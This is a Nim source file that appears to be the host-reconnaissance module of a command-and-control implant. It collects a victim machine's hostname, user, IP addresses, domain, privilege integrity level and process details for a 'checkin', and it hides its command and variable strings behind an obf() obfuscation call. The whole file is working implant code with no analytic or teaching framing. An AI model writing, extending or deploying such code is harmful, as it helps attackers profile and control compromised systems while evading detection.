import std/[os, osproc, strutils]
import strenc

when defined(linux):
  import posix

when defined(windows):
  import winim/lean
  import ../tasks/token_manager

  proc getIntegrityLevel*(): int =
    ## Returns 0=Untrusted, 1=Low, 2=Medium, 3=High, 4=System, -1=Error
    var hToken: HANDLE
    if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, addr hToken) == 0:
      return -1
    defer: CloseHandle(hToken)
    var len: DWORD = 0
    discard GetTokenInformation(hToken, tokenIntegrityLevel, nil, 0, addr len)
    if len == 0:
      return -1
    var buf = alloc(len)
    defer: dealloc(buf)
    if GetTokenInformation(hToken, tokenIntegrityLevel, buf, len, addr len) == 0:
      return -1
    let til = cast[PTOKEN_MANDATORY_LABEL](buf)
    let pSid = til.Label.Sid
    let count = int(GetSidSubAuthorityCount(pSid)[]) - 1
    let pIntegrity = GetSidSubAuthority(pSid, DWORD(count))
    let integrity = int(pIntegrity[])
    # Map integrity value to level
    if integrity >= SECURITY_MANDATORY_SYSTEM_RID:
      return 4 # System
    elif integrity >= SECURITY_MANDATORY_HIGH_RID:
      return 3 # High
    elif integrity >= SECURITY_MANDATORY_MEDIUM_RID:
      return 2 # Medium
    elif integrity >= SECURITY_MANDATORY_LOW_RID:
      return 1 # Low
    else:
      return 0 # Untrusted

type
  SystemInfo* = object
    hostname*: string
    user*: string
    os*: string
    arch*: string
    pid*: int
    ips*: seq[string]
    domain*: string
    integrityLevel*: int
    processName*: string
    cwd*: string

proc getSystemInfo*(): SystemInfo =
  ## Collect system information for checkin
  result = SystemInfo()
  
  # Get hostname
  try:
    when defined(windows):
      result.hostname = getEnv(obf("COMPUTERNAME"), "unknown")
    else:
      let output = execProcess(obf("hostname"))
      result.hostname = output.strip()
  except:
    result.hostname = "unknown"
  
  # Get username - use proper API that respects thread impersonation
  try:
    when defined(windows):
      result.user = getCurrentUsername()
      if result.user.len == 0:
        result.user = getEnv(obf("USERNAME"), "unknown")
    else:
      result.user = getEnv(obf("USER"), "unknown")
  except:
    result.user = "unknown"
  
  # Get OS
  when defined(windows):
    result.os = "Windows"
  elif defined(linux):
    result.os = "Linux"
  else:
    result.os = "Unknown"
  
  # Get architecture
  when defined(amd64) or defined(x86_64):
    result.arch = "x64"
  elif defined(i386):
    result.arch = "x86"
  elif defined(arm64) or defined(aarch64):
    result.arch = "arm64"
  else:
    result.arch = "unknown"
  
  # Get PID
  result.pid = getCurrentProcessId()
  
  # Get IPs
  result.ips = @[]
  try:
    when defined(windows):
      let output = execProcess(obf("ipconfig"))
      for line in output.splitLines():
        if obf("IPv4") in line:
          let parts = line.split(":")
          if parts.len > 1:
            let ip = parts[1].strip()
            if ip.len > 0:
              result.ips.add(ip)
    else:
      let output = execProcess(obf("hostname -I"))
      for ip in output.strip().split(" "):
        if ip.len > 0:
          result.ips.add(ip)
  except:
    result.ips = @[obf("127.0.0.1")]
  
  # Get domain (Windows only for now)
  when defined(windows):
    try:
      result.domain = getEnv(obf("USERDOMAIN"), "")
    except:
      result.domain = ""
  else:
    result.domain = ""
  
  # Integrity level (real, Windows only; Linux: 3=root, 2=normal)
  when defined(windows):
    result.integrityLevel = getIntegrityLevel()
  elif defined(linux):
    try:
      result.integrityLevel = if getuid() == 0: 3 else: 2
    except:
      result.integrityLevel = 2
  else:
    result.integrityLevel = 2  # Medium by default

  # Get current working directory
  try:
    result.cwd = getCurrentDir()
  except:
    result.cwd = "/"

  # Get process name
  try:
    result.processName = getAppFilename().extractFilename()
  except:
    result.processName = obf("poopsie.exe")
